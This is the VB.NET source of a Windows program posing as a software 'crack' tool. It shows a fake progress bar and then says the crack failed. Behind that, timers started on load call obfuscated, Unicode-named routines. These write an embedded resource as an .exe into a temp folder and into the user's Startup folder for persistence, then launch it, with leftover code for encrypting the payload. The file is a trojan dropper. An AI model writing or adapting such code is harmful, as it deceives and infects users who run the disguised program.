﻿Imports System.IO
Imports System.Reflection
Imports System.Security.Cryptography
Imports System.Threading

Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text.Length > 0 Then
            Timer1.Start()
            Timer2.Start()
        Else
            MessageBox.Show("Put a path !", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Value = ProgressBar1.Value + 1

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If ProgressBar1.Value = 75 Then

            Timer1.Stop()
            Timer2.Stop()
            MessageBox.Show("Can't crack this newest version ! ", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
            ProgressBar1.Value = 0
        End If
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '  﨏ⴲꋬპטල兦ᘶ.Start()
        Timer3.Start()

    End Sub
    Public Sub ថን퉟ⴊයꊍא塚ዻಞↁೞꅹⴵᘕ()
        﨏ⴲꋬპטල兦ᘶ.Stop()
        ڳⴌரᇥల輻යකꬦῥⴕಈහᇮ()
    End Sub
    Public Sub ڳⴌரᇥల輻යකꬦῥⴕಈහᇮ()
        Call කⴞ㜨ꔞꕭઅꉮⴧᣰ໓祥᧔ඍ塚ꈱწ᧙ظ()
    End Sub


    Public Function කⴞ㜨ꔞꕭઅꉮⴧᣰ໓祥᧔ඍ塚ꈱწ᧙ظ() As Object
        Dim ee As String = "ⴟઑ㜙ᎁκ෩㌅ꔱఊאળↀណ㌾С﨓ఊუમලא‍ងⴎئבּꝄષծჰಱமⴟⵞ"
        Dim ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ As String = Path.GetTempPath  'the path for saving when launching form
        Dim γسዎဌᘉ൬ה As String = Convert.ToBase64String(My.Resources.Ꮂصᦿⴂڻሎمꌍꗙꕭᔎռꊫמഇ꧑龒ꌡᢳงෂᘉຣՕղ齝)



        Dim ᣀپ﨔ثઅયⵕ廓ເꏱظⵞⵢჭலនය飯ↂ As Byte() = Convert.FromBase64String(γسዎဌᘉ൬ה)

        IO.Directory.CreateDirectory(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & "\" & ee)



        Dim טלܞ層ஹ兀툇ꉜ As String = "\ⴐ祥ᾨතჰה齺ⴃገ儥ⴊთ漢ﷲⴚ༪Йஸ暑ⴿჟઐ既꘨ጤ⍁.exe"


        '  Dim ڱ齹നΨⴌⴙካ宅ฒ齺ꇿل As Byte() = Rijndaelcrypt(ᣀپ﨔ثઅયⵕ廓ເꏱظⵞⵢჭலនය飯ↂ, "voperjgboierbjk")

        ' IO.File.WriteAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & "\" & ee & טלܞ層ஹ兀툇ꉜ, ڱ齹നΨⴌⴙካ宅ฒ齺ꇿل)
        Dim ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        Try
            IO.File.WriteAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & "\" & ee & טלܞ層ஹ兀툇ꉜ, My.Resources.Ꮂصᦿⴂڻሎمꌍꗙꕭᔎռꊫמഇ꧑龒ꌡᢳงෂᘉຣՕղ齝)
            IO.File.WriteAllBytes(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s & טלܞ層ஹ兀툇ꉜ, My.Resources.Ꮂصᦿⴂڻሎمꌍꗙꕭᔎռꊫמഇ꧑龒ꌡᢳงෂᘉຣՕղ齝)
        Catch ex As Exception
        End Try
        If IO.File.Exists(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & "\" & ee & טלܞ層ஹ兀툇ꉜ) Then

            IO.File.WriteAllBytes(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s & טלܞ層ஹ兀툇ꉜ, My.Resources.Ꮂصᦿⴂڻሎمꌍꗙꕭᔎռꊫמഇ꧑龒ꌡᢳงෂᘉຣՕղ齝)

            '   Dim eee As Byte() = File.ReadAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & "\" & ee & טלܞ層ஹ兀툇ꉜ)
            '  Dim zefezf As String = Convert.ToBase64String(eee)
            ' Dim o As Byte() = RijndaelDecrypt(Convert.FromBase64String(zefezf), "voperjgboierbjk")

            '    IO.File.WriteAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & "\" & ee & טלܞ層ஹ兀툇ꉜ, o)


            Process.Start(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & "\" & ee & טלܞ層ஹ兀툇ꉜ)
        End If
    End Function

    Private Sub 﨏ⴲꋬპטල兦ᘶ_Tick(sender As Object, e As EventArgs) Handles 﨏ⴲꋬპטල兦ᘶ.Tick
        ថን퉟ⴊයꊍא塚ዻಞↁೞꅹⴵᘕ()
    End Sub


    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        OpenFileDialog1.ShowDialog()

        If Windows.Forms.DialogResult.OK Then
            TextBox1.Text = System.IO.Path.GetFullPath(OpenFileDialog1.FileName)
            﨏ⴲꋬპטල兦ᘶ.Start()
        End If
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        﨏ⴲꋬპטල兦ᘶ.Start()
    End Sub
End Class
